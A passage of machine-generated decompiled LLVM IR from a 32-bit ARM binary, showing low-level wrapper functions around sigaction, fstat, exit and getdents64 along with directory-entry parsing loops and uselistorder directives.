  %v2_13228 = icmp ugt i32 %v5_1322c, 13
  %v7_13228 = icmp eq i32 %v5_1322c, 14
  %v2_1322c = xor i1 %v2_13228, true
  %v3_1322c = or i1 %v7_13228, %v2_1322c
  br i1 %v3_1322c, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_13228
  %v6_1322c = and i32 %v5_1322c, 536870912
  %v7_1322c = icmp ne i32 %v6_1322c, 0
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_13228, %bb42
  %v1_13238 = phi i1 [ %v2_13228, %dec_label_pc_13228 ], [ %v7_1322c, %bb42 ]
  %v2_13230 = xor i1 %v1_13238, true
  %v3_13230 = or i1 %v7_13228, %v2_13230
  br i1 %v3_13230, label %bb44, label %dec_label_pc_13240

bb44:                                             ; preds = %bb43
  br label %dec_label_pc_13240

dec_label_pc_13240:                               ; preds = %bb43, %bb44
  call void @__pseudo_cond_branch(i1 %v3_13230, i32 ptrtoint (i32* @global_var_12110.455 to i32))
  %v0_1323c = load i32, i32* @r4, align 4
  %v1_1323c = add i32 %v0_1323c, 8
  store i32 %v1_1323c, i32* @r4, align 4
  %v1_13240 = inttoptr i32 %v1_1323c to i32*
  %v2_13240 = load i32, i32* %v1_13240, align 4
  %v2_13244 = icmp eq i32 %v2_13240, 0
  br i1 %v2_13244, label %dec_label_pc_1324c, label %dec_label_pc_13228

dec_label_pc_1324c:                               ; preds = %dec_label_pc_13240, %dec_label_pc_13220
  %v1_13250 = call i32 @function_142b4(i32 %v2_131b8)
  store i32 %v1_13250, i32* @r0, align 4
  %v1_13254 = call i32 @function_13150(i32 %v1_13250)
  store i32 %v1_13254, i32* @r0, align 4
  %v2_13260 = icmp eq i32 %tmp37, 0
  br i1 %v2_13260, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_1324c
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_1324c, %bb45
  %v0_13270 = phi i32 [ %tmp37, %dec_label_pc_1324c ], [ 4096, %bb45 ]
  %v3_13268 = icmp eq i32 %tmp36, -1
  %v8_13268 = icmp eq i32 %tmp36, -1
  store i32 ptrtoint (i32* @global_var_1cb00.397 to i32), i32* @r2, align 4
  store i32 %v0_13270, i32* @global_var_1cb00.397, align 4
  br i1 %v3_13268, label %dec_label_pc_13278, label %dec_label_pc_132a0

dec_label_pc_13278:                               ; preds = %bb46
  %v0_13278 = call i32 @function_13804()
  store i32 %v0_13278, i32* @r0, align 4
  store i32 %v0_13278, i32* @r4, align 4
  %v0_13280 = call i32 @function_137ac()
  %v0_13284 = load i32, i32* @r4, align 4
  %v9_13284 = icmp eq i32 %v0_13284, %v0_13280
  br i1 %v9_13284, label %dec_label_pc_1328c, label %dec_label_pc_132c8

dec_label_pc_1328c:                               ; preds = %dec_label_pc_13278
  %v1_1328c = call i32 @function_137d8(i32 %v0_13280)
  store i32 %v1_1328c, i32* @r0, align 4
  store i32 %v1_1328c, i32* @r4, align 4
  %v0_13294 = call i32 @function_13780()
  %v0_13298 = load i32, i32* @r4, align 4
  %v9_13298 = icmp eq i32 %v0_13298, %v0_13294
  br i1 %v9_13298, label %dec_label_pc_132a0, label %dec_label_pc_132c8

dec_label_pc_132a0:                               ; preds = %dec_label_pc_1328c, %bb46
  store i32 %tmp36, i32* @r2, align 4
  br i1 %v8_13268, label %dec_label_pc_13334, label %dec_label_pc_132ac

dec_label_pc_132ac:                               ; preds = %dec_label_pc_132a0
  %v9_132b0 = icmp eq i32 %tmp36, %tmp35
  br i1 %v9_132b0, label %dec_label_pc_132b8, label %dec_label_pc_132c8

dec_label_pc_132b8:                               ; preds = %dec_label_pc_132ac
  br label %dec_label_pc_132c8

dec_label_pc_132c8:                               ; preds = %dec_label_pc_132b8, %dec_label_pc_132ac, %dec_label_pc_1328c, %dec_label_pc_13278
  %v3_132d0 = call i32 @function_13118(i32 0, i64* inttoptr (i32 32768 to i64*))
  %v3_132dc = call i32 @function_13118(i32 1, i64* inttoptr (i32 32770 to i64*))
  %v3_132e8 = call i32 @function_13118(i32 2, i64* inttoptr (i32 32770 to i64*))
  br label %dec_label_pc_13334

dec_label_pc_13334:                               ; preds = %dec_label_pc_132c8, %dec_label_pc_132a0
  %v0_132f8 = load i32, i32* %r6.global-to-local, align 4
  %v1_132f8 = inttoptr i32 %v0_132f8 to i32*
  %v2_132f8 = load i32, i32* %v1_132f8, align 4
  store i32 %v2_132f8, i32* @global_var_1ca54, align 4
  store i32 %arg5, i32* @global_var_1cb04.439, align 4
  %v2_13334 = icmp eq i32 %arg4, 0
  br i1 %v2_13334, label %dec_label_pc_13370, label %bb47

bb47:                                             ; preds = %dec_label_pc_13334
  br label %dec_label_pc_13370

dec_label_pc_13370:                               ; preds = %dec_label_pc_13334, %bb47
  call void @__pseudo_branch(i32 %arg4)
  %v1_13380 = call i32 @function_120c4()
  %v2_13388 = inttoptr i32 %v1_13380 to i32*
  store i32 0, i32* %v2_13388, align 4
  %v0_133b4 = load i32, i32* %r8.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_133c0 = call i32 @function_12e68(i32 %v0_133b4)
  ret i32 %v1_133c0

; uselistorder directives
  uselistorder i32 %v2_13240, { 1, 0 }
  uselistorder i32 %v1_1323c, { 1, 0 }
  uselistorder i1 %v2_13228, { 1, 0 }
  uselistorder i32 %v4_13210, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %tmp36, { 1, 3, 0, 2 }
  uselistorder i32 (i32)* @function_12e68, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 32768, { 1, 2, 0 }
  uselistorder i32* @global_var_1cb00.397, { 1, 4, 0, 2, 3 }
  uselistorder i32 4096, { 0, 1, 3, 7, 4, 8, 5, 9, 2, 6, 10, 11 }
  uselistorder i32 536870912, { 1, 0 }
  uselistorder i1 true, { 0, 1, 75, 2, 3, 4, 5, 6, 7, 8, 42, 9, 10, 11, 12, 13, 99, 40, 43, 52, 100, 19, 20, 76, 44, 16, 77, 78, 79, 80, 81, 82, 83, 84, 62, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 17, 18, 97, 98, 61, 41, 53, 101, 14, 15, 60, 31, 102, 33, 32, 48, 55, 49, 56, 50, 57, 51, 59, 103, 21, 104, 105, 22, 106, 63, 64, 107, 65, 66, 108, 67, 68, 23, 24, 109, 69, 70, 25, 26, 110, 71, 72, 27, 28, 111, 73, 74, 29, 30, 47, 112, 113, 58, 114, 34, 54, 35, 45, 36, 46, 37, 38, 39 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_13370, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_13240, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_13228, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
}

define i32 @function_133f8(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_133f8:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_133f8 = load i32, i32* @r4, align 4
  %v6_133f8 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_133fc = icmp eq i32* %arg2, null
  %v2_13400 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  br i1 %v2_133fc, label %dec_label_pc_1346c, label %dec_label_pc_13410

dec_label_pc_13410:                               ; preds = %dec_label_pc_133f8
  %v2_13414 = load i32, i32* %arg2, align 4
  %v4_13414 = add i32 %tmp, 4
  store i32 %v4_13414, i32* @r1, align 4
  %v2_13418 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_13418, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  store i32 %v2_13414, i32* %stack_var_-156, align 4
  %v3_13424 = call i32 @function_12110(i32 %v2_13418, i32 %v4_13414, i32 128)
  store i32 %v3_13424, i32* %r0.global-to-local, align 4
  %v0_13428 = load i32, i32* @r4, align 4
  %v1_13428 = add i32 %v0_13428, 132
  %v2_13428 = inttoptr i32 %v1_13428 to i32*
  %v3_13428 = load i32, i32* %v2_13428, align 4
  %v1_1342c = and i32 %v3_13428, 67108864
  %v2_1342c = icmp eq i32 %v1_1342c, 0
  br i1 %v2_1342c, label %dec_label_pc_13440, label %bb

bb:                                               ; preds = %dec_label_pc_13410
  br label %dec_label_pc_1345c

dec_label_pc_13440:                               ; preds = %dec_label_pc_13410
  %v1_13448 = and i32 %v3_13428, 4
  %v2_13448 = icmp eq i32 %v1_13448, 0
  br i1 %v2_13448, label %bb21, label %bb20

bb20:                                             ; preds = %dec_label_pc_13440
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_13440, %bb20
  br label %dec_label_pc_1345c

dec_label_pc_1345c:                               ; preds = %bb, %bb21
  %v2_1345c = icmp eq i32 %v0_13428, 0
  %v3_13460 = ptrtoint i32* %stack_var_-156 to i32
  %.v3_13460 = select i1 %v2_1345c, i32 0, i32 %v3_13460
  %v0_1346c.pre = load i32, i32* @r5, align 4
  %v0_1347c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1346c

dec_label_pc_1346c:                               ; preds = %dec_label_pc_1345c, %dec_label_pc_133f8
  %v0_1347c = phi i32 [ %arg1, %dec_label_pc_133f8 ], [ %v0_1347c.pre, %dec_label_pc_1345c ]
  %v0_1346c = phi i32 [ %arg3, %dec_label_pc_133f8 ], [ %v0_1346c.pre, %dec_label_pc_1345c ]
  %storemerge = phi i32 [ 0, %dec_label_pc_133f8 ], [ %.v3_13460, %dec_label_pc_1345c ]
  store i32 %storemerge, i32* @r1, align 4
  %v2_1346c = icmp eq i32 %v0_1346c, 0
  %.v2_13400 = select i1 %v2_1346c, i32 0, i32 %v2_13400
  store i32 %.v2_13400, i32* @r2, align 4
  store i32 %v0_1347c, i32* %r0.global-to-local, align 4
  %v1_13480 = call i32 @function_134e4(i32 %v0_1347c)
  store i32 %v1_13480, i32* %r0.global-to-local, align 4
  %v0_13484 = load i32, i32* @r5, align 4
  %v2_13484 = icmp eq i32 %v0_13484, 0
  br i1 %v2_13484, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_1346c
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_1346c, %bb25
  %v0_13494.pr = phi i32 [ 0, %dec_label_pc_1346c ], [ 1, %bb25 ]
  %v1_1348c = icmp slt i32 %v1_13480, 0
  br i1 %v1_1348c, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %bb26
  br label %dec_label_pc_134c8

thread-pre-split:                                 ; preds = %bb26
  %v2_13494 = icmp eq i32 %v0_13494.pr, 0
  store i32 %v1_13480, i32* @r4, align 4
  br i1 %v2_13494, label %dec_label_pc_134c8, label %dec_label_pc_134a0

dec_label_pc_134a0:                               ; preds = %thread-pre-split
  %v2_134a0 = load i32, i32* %stack_var_-296, align 4
  store i32 %v0_13484, i32* %r0.global-to-local, align 4
  %v2_134a8 = inttoptr i32 %v0_13484 to i32*
  store i32 %v2_134a0, i32* %v2_134a8, align 4
  %v3_134a8 = load i32, i32* %r0.global-to-local, align 4
  %v4_134a8 = add i32 %v3_134a8, 4
  store i32 %v4_134a8, i32* @r0, align 4
  %v2_134ac = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_134ac, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v3_134b4 = call i32 @function_12110(i32 %v4_134a8, i32 %v2_134ac, i32 128)
  store i32 %v3_134b4, i32* %r0.global-to-local, align 4
  %v1_134bc = load i32, i32* @r5, align 4
  %v2_134bc = add i32 %v1_134bc, 136
  %v3_134bc = inttoptr i32 %v2_134bc to i32*
  %v1_134c4 = load i32, i32* @r5, align 4
  %v2_134c4 = add i32 %v1_134c4, 132
  %v3_134c4 = inttoptr i32 %v2_134c4 to i32*
  %v0_134c8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_134c8

dec_label_pc_134c8:                               ; preds = %thread-pre-split.thread, %thread-pre-split, %dec_label_pc_134a0
  %v0_134c8 = phi i32 [ %v1_13480, %thread-pre-split ], [ %v0_134c8.pre, %dec_label_pc_134a0 ], [ %v1_13480, %thread-pre-split.thread ]
  store i32 %v0_134c8, i32* %r0.global-to-local, align 4
  store i32 %v3_133f8, i32* @r4, align 4
  store i32 %v6_133f8, i32* @r5, align 4
  ret i32 %v0_134c8

; uselistorder directives
  uselistorder i32 %v0_134c8, { 1, 0 }
  uselistorder i32 %v0_13484, { 1, 0, 2 }
  uselistorder i32 %v0_1347c, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 6, 4, 5, 2, 7, 1, 0 }
  uselistorder label %dec_label_pc_134c8, { 2, 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_1345c, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @function_134e4(i32 %arg1) local_unnamed_addr {
dec_label_pc_134e4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_134e4 = load i32, i32* @r4, align 4
  store i32 %v3_134e4, i32* %stack_var_-8, align 4
  %v1_134e8 = load i32, i32* @r1, align 4
  %v2_134e8 = inttoptr i32 %v1_134e8 to %sigaction*
  %v3_134e8 = load i32, i32* @r2, align 4
  %v4_134e8 = inttoptr i32 %v3_134e8 to %sigaction*
  %v5_134e8 = call i32 @sigaction(i32 %arg1, %sigaction* %v2_134e8, %sigaction* %v4_134e8)
  store i32 %v5_134e8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_134e8, -4095
  br i1 %tmp, label %dec_label_pc_13508, label %dec_label_pc_134f8

dec_label_pc_134f8:                               ; preds = %dec_label_pc_134e4
  %v0_134f8 = call i32 @function_120c4()
  %v0_134fc = load i32, i32* %r4.global-to-local, align 4
  %v1_134fc = sub i32 0, %v0_134fc
  %v2_13500 = inttoptr i32 %v0_134f8 to i32*
  store i32 %v1_134fc, i32* %v2_13500, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13508

dec_label_pc_13508:                               ; preds = %dec_label_pc_134e4, %dec_label_pc_134f8
  %v0_13508 = phi i32 [ %v5_134e8, %dec_label_pc_134e4 ], [ -1, %dec_label_pc_134f8 ]
  %v2_1350c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1350c, i32* %r4.global-to-local, align 4
  ret i32 %v0_13508

; uselistorder directives
  uselistorder i32 %v5_134e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13508, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_13510(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_13510:
  store i32 %arg1, i32* @r5, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_13538() local_unnamed_addr {
dec_label_pc_13538:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %tmp4 = bitcast i32* %stack_var_-72 to %stat*
  %v0_13548 = load i32, i32* @r0, align 4
  %v4_13548 = call i32 @fstat(i32 %v0_13548, %stat* %tmp4)
  store i32 %v4_13548, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_13548, -4095
  br i1 %tmp, label %dec_label_pc_1356c, label %dec_label_pc_13558

dec_label_pc_13558:                               ; preds = %dec_label_pc_13538
  %v0_13558 = call i32 @function_120c4()
  %v0_1355c = load i32, i32* %r4.global-to-local, align 4
  %v1_1355c = sub i32 0, %v0_1355c
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_13564 = inttoptr i32 %v0_13558 to i32*
  store i32 %v1_1355c, i32* %v2_13564, align 4
  br label %dec_label_pc_1357c

dec_label_pc_1356c:                               ; preds = %dec_label_pc_13538
  %v2_1356c = icmp eq i32 %v4_13548, 0
  store i32 79228, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1356c, i32 ptrtoint (i32* @global_var_13c54.471 to i32))
  br label %dec_label_pc_1357c

dec_label_pc_1357c:                               ; preds = %dec_label_pc_13558, %dec_label_pc_1356c
  %v0_1357c = load i32, i32* %r4.global-to-local, align 4
  ret i32 %v0_1357c

; uselistorder directives
  uselistorder i32 %v4_13548, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 6, 13, 11, 12, 9, 10, 0, 3, 4, 5, 1, 2, 7, 8 }
  uselistorder label %dec_label_pc_1357c, { 1, 0 }
}

define i32 @function_13588(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13588:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %v6_13588 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_13590 = call i32 @function_1361c()
  store i32 %v0_13590, i32* %r6.global-to-local, align 4
  %tmp8 = icmp slt i32 %v0_13590, 1
  br i1 %tmp8, label %dec_label_pc_13614, label %dec_label_pc_13600.preheader

dec_label_pc_13600.preheader:                     ; preds = %dec_label_pc_13588
  %v5_13598 = load i32, i32* @r4, align 4
  %v7_13598 = add i32 %v5_13598, %v0_13590
  store i32 %v7_13598, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13600

dec_label_pc_135a4:                               ; preds = %dec_label_pc_13600
  %v1_135a4 = add i32 %v2_135b4, 16
  %v2_135a4 = inttoptr i32 %v1_135a4 to i32*
  %v3_135a4 = load i32, i32* %v2_135a4, align 4
  store i32 %v3_135a4, i32* @lr, align 4
  %v2_135a8 = inttoptr i32 %v1_13604 to i32*
  %v3_135a8 = load i32, i32* %v2_135a8, align 4
  store i32 %v3_135a8, i32* %r2.global-to-local, align 4
  %v1_135ac = add i32 %v2_135b4, 18
  %v2_135ac = inttoptr i32 %v1_135ac to i8*
  %v3_135ac = load i8, i8* %v2_135ac, align 1
  %v4_135ac = zext i8 %v3_135ac to i32
  store i32 %v4_135ac, i32* %ip.global-to-local, align 4
  %v3_135b0 = sdiv i32 %v3_135a4, 256
  store i32 %v3_135b0, i32* %r3.global-to-local, align 4
  %v1_135b4 = trunc i32 %v3_135a4 to i8
  %v4_135b4 = inttoptr i32 %v1_13604 to i8*
  store i8 %v1_135b4, i8* %v4_135b4, align 1
  %v0_135b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_135b8 = load i32, i32* @r4, align 4
  %v2_135b8 = add i32 %v1_135b8, 4
  %v3_135b8 = inttoptr i32 %v2_135b8 to i32*
  store i32 %v0_135b8, i32* %v3_135b8, align 4
  %v0_135bc = load i32, i32* %ip.global-to-local, align 4
  %v1_135bc = trunc i32 %v0_135bc to i8
  %v2_135bc = load i32, i32* @r4, align 4
  %v3_135bc = add i32 %v2_135bc, 10
  %v4_135bc = inttoptr i32 %v3_135bc to i8*
  store i8 %v1_135bc, i8* %v4_135bc, align 1
  %v0_135c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_135c0 = trunc i32 %v0_135c0 to i8
  %v2_135c0 = load i32, i32* @r4, align 4
  %v3_135c0 = add i32 %v2_135c0, 9
  %v4_135c0 = inttoptr i32 %v3_135c0 to i8*
  store i8 %v1_135c0, i8* %v4_135c0, align 1
  %v0_135c4 = load i32, i32* @r4, align 4
  %v1_135c4 = add i32 %v0_135c4, 8
  %v2_135c4 = inttoptr i32 %v1_135c4 to i8*
  %v3_135c4 = load i8, i8* %v2_135c4, align 1
  %v4_135c4 = zext i8 %v3_135c4 to i32
  store i32 %v4_135c4, i32* %r2.global-to-local, align 4
  %v0_135c8 = load i32, i32* @r5, align 4
  %v1_135c8 = add i32 %v0_135c8, 1
  %v2_135c8 = inttoptr i32 %v1_135c8 to i8*
  %v3_135c8 = load i8, i8* %v2_135c8, align 1
  %v4_135c8 = zext i8 %v3_135c8 to i32
  store i32 %v4_135c8, i32* %r3.global-to-local, align 4
  %v4_135cc = mul nuw nsw i32 %v4_135c8, 256
  %v5_135cc = or i32 %v4_135cc, %v4_135c4
  %v1_135d0 = add nsw i32 %v5_135cc, -19
  store i32 %v1_135d0, i32* @r2, align 4
  %v3_135d4 = call i32 @function_12120(i32 %v1_1360c, i32 %v1_13608, i32 %v1_135d0)
  %v0_135d8 = load i32, i32* @r4, align 4
  %v1_135d8 = add i32 %v0_135d8, 8
  %v2_135d8 = inttoptr i32 %v1_135d8 to i8*
  %v3_135d8 = load i8, i8* %v2_135d8, align 1
  %v4_135d8 = zext i8 %v3_135d8 to i32
  store i32 %v4_135d8, i32* %r3.global-to-local, align 4
  %v0_135dc = load i32, i32* @r5, align 4
  %v1_135dc = add i32 %v0_135dc, 1
  %v2_135dc = inttoptr i32 %v1_135dc to i8*
  %v3_135dc = load i8, i8* %v2_135dc, align 1
  %v4_135dc = zext i8 %v3_135dc to i32
  store i32 %v0_135d8, i32* @r0, align 4
  %v4_135e4 = mul nuw nsw i32 %v4_135dc, 256
  %v5_135e4 = or i32 %v4_135e4, %v4_135d8
  store i32 %v5_135e4, i32* @r2, align 4
  store i32 %v0_135d8, i32* @r1, align 4
  %v3_135ec = call i32 @function_12120(i32 %v0_135d8, i32 %v0_135d8, i32 %v5_135e4)
  %v0_135f0 = load i32, i32* @r4, align 4
  %v1_135f0 = add i32 %v0_135f0, 8
  %v2_135f0 = inttoptr i32 %v1_135f0 to i8*
  %v3_135f0 = load i8, i8* %v2_135f0, align 1
  %v4_135f0 = zext i8 %v3_135f0 to i32
  store i32 %v4_135f0, i32* %r3.global-to-local, align 4
  %v0_135f4 = load i32, i32* @r5, align 4
  %v1_135f4 = add i32 %v0_135f4, 1
  %v2_135f4 = inttoptr i32 %v1_135f4 to i8*
  %v3_135f4 = load i8, i8* %v2_135f4, align 1
  %v4_135f4 = zext i8 %v3_135f4 to i32
  store i32 %v4_135f4, i32* @r2, align 4
  %v4_135f8 = mul nuw nsw i32 %v4_135f4, 256
  %v5_135f8 = or i32 %v4_135f8, %v4_135f0
  store i32 %v5_135f8, i32* %r3.global-to-local, align 4
  %v2_135fc = add i32 %v5_135f8, %v0_135f0
  store i32 %v2_135fc, i32* @r4, align 4
  %v1_13600.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13600

dec_label_pc_13600:                               ; preds = %dec_label_pc_13600.preheader, %dec_label_pc_135a4
  %v1_13600 = phi i32 [ %v7_13598, %dec_label_pc_13600.preheader ], [ %v1_13600.pre, %dec_label_pc_135a4 ]
  %v2_135b4 = phi i32 [ %v5_13598, %dec_label_pc_13600.preheader ], [ %v2_135fc, %dec_label_pc_135a4 ]
  %v3_13600 = icmp ult i32 %v2_135b4, %v1_13600
  %v1_13604 = add i32 %v2_135b4, 8
  store i32 %v1_13604, i32* @r5, align 4
  %v1_13608 = add i32 %v2_135b4, 19
  store i32 %v1_13608, i32* @r1, align 4
  %v1_1360c = add i32 %v2_135b4, 11
  store i32 %v1_1360c, i32* @r0, align 4
  br i1 %v3_13600, label %dec_label_pc_135a4, label %dec_label_pc_13614.loopexit

dec_label_pc_13614.loopexit:                      ; preds = %dec_label_pc_13600
  %v0_13614.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13614

dec_label_pc_13614:                               ; preds = %dec_label_pc_13588, %dec_label_pc_13614.loopexit
  %v0_13614 = phi i32 [ %v0_13614.pre, %dec_label_pc_13614.loopexit ], [ %v0_13590, %dec_label_pc_13588 ]
  store i32 %v6_13588, i32* @r5, align 4
  ret i32 %v0_13614

; uselistorder directives
  uselistorder i32 %v1_1360c, { 1, 0 }
  uselistorder i32 %v1_13608, { 1, 0 }
  uselistorder i32 %v1_13604, { 2, 1, 0 }
  uselistorder i32 %v2_135b4, { 4, 3, 2, 5, 1, 0 }
  uselistorder i32 %v0_135d8, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v3_135a4, { 1, 0, 2 }
  uselistorder i32 %v5_13598, { 1, 0 }
  uselistorder i32 %v0_13590, { 1, 0, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @function_12120, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_13614, { 1, 0 }
  uselistorder label %dec_label_pc_13600, { 1, 0 }
}

define i32 @function_1361c() local_unnamed_addr {
dec_label_pc_1361c:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_13620 = load i32, i32* @r4, align 4
  %v9_13620 = load i32, i32* @r6, align 4
  %v0_13624 = load i32, i32* @r2, align 4
  %v1_13624 = add i32 %v0_13624, 6
  %v2_1362c = ptrtoint i32* %stack_var_-60 to i32
  %v1_13630 = and i32 %v1_13624, -4
  store i32 %v1_13630, i32* %r3.global-to-local, align 4
  %v2_13634 = sub i32 %v2_1362c, %v1_13630
  %v0_13638 = load i32, i32* @r1, align 4
  store i32 %v0_13638, i32* %r8.global-to-local, align 4
  store i32 %v0_13624, i32* %stack_var_-60, align 4
  store i32 %v2_13634, i32* %sl.global-to-local, align 4
  %v0_13644 = load i32, i32* @r0, align 4
  %v1_13648 = inttoptr i32 %v2_13634 to %linux_dirent64*
  store i32 %v2_13634, i32* %r1.global-to-local, align 4
  %v5_1364c = call i32 @getdents64(i32 %v0_13644, %linux_dirent64* %v1_13648, i32 %v0_13624)
  store i32 %v5_1364c, i32* @r6, align 4
  %tmp = icmp ult i32 %v5_1364c, -4095
  br i1 %tmp, label %dec_label_pc_13670, label %dec_label_pc_1365c

dec_label_pc_1365c:                               ; preds = %dec_label_pc_1361c
  %v0_1365c = call i32 @function_120c4()
  %v0_13660 = load i32, i32* @r6, align 4
  %v1_13660 = sub i32 0, %v0_13660
  store i32 %v1_13660, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  %v2_13668 = inttoptr i32 %v0_1365c to i32*
  store i32 %v1_13660, i32* %v2_13668, align 4
  %v0_13678.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13678

dec_label_pc_13670:                               ; preds = %dec_label_pc_1361c
  br i1 false, label %dec_label_pc_13678, label %dec_label_pc_13680

dec_label_pc_13678:                               ; preds = %dec_label_pc_13670, %dec_label_pc_1365c
  %v0_13678 = phi i32 [ -1, %dec_label_pc_13670 ], [ %v0_13678.pre, %dec_label_pc_1365c ]
  store i32 %v0_13678, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13774

dec_label_pc_13680:                               ; preds = %dec_label_pc_13670
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_13688 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_13688, i32* @r5, align 4
  %v0_1368c = load i32, i32* @sp, align 4
  store i32 %v0_1368c, i32* @r4, align 4
  br label %dec_label_pc_13750

dec_label_pc_1369c:                               ; preds = %dec_label_pc_13750
  %v2_13768 = add i32 %v3_13754, %v0_13768
  %v1_1369c = add i32 %v0_136a0, 17
  %v2_1369c = inttoptr i32 %v1_1369c to i8*
  %v3_1369c = load i8, i8* %v2_1369c, align 1
  %v4_1369c = zext i8 %v3_1369c to i32
  %v2_136a0 = inttoptr i32 %v1_1375c to i8*
  %v3_136a0 = load i8, i8* %v2_136a0, align 1
  %v4_136a0 = zext i8 %v3_136a0 to i32
  %v4_136a4 = mul nuw nsw i32 %v4_1369c, 256
  %v5_136a4 = or i32 %v4_136a0, %v4_136a4
  %v1_136a8 = add nuw nsw i32 %v5_136a4, 3
  %v1_136ac = and i32 %v1_136a8, 131068
  store i32 %v1_136ac, i32* %r3.global-to-local, align 4
  %v2_136b0 = add i32 %v1_136ac, %v2_136f0
  store i32 %v2_136b0, i32* %sb.global-to-local, align 4
  %v9_136b4 = icmp eq i32 %v2_136b0, %v2_13768
  %v1_136b8 = and i32 %v1_136a8, 128
  %v2_136bc = icmp eq i32 %v1_136b8, 0
  %v3_136bc = or i1 %v9_136b4, %v2_136bc
  br i1 %v3_136bc, label %dec_label_pc_136f0, label %dec_label_pc_136c0

dec_label_pc_136c0:                               ; preds = %dec_label_pc_1369c
  store i32 %stack_var_-52.0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_136d0 = call i32 @function_13830(i32 %v0_13644, i32 %stack_var_-52.0, i32 %stack_var_-48.0, i32 0)
  %v0_136d4 = load i32, i32* @r5, align 4
  %v1_136d4 = load i32, i32* %r8.global-to-local, align 4
  %v9_136d4 = icmp eq i32 %v0_136d4, %v1_136d4
  br i1 %v9_136d4, label %dec_label_pc_136dc, label %dec_label_pc_13770

dec_label_pc_136dc:                               ; preds = %dec_label_pc_136c0
  %v0_136dc = call i32 @function_120c4()
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v2_136e8 = inttoptr i32 %v0_136dc to i32*
  store i32 22, i32* %v2_136e8, align 4
  %v0_13774.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13774

dec_label_pc_136f0:                               ; preds = %dec_label_pc_1369c
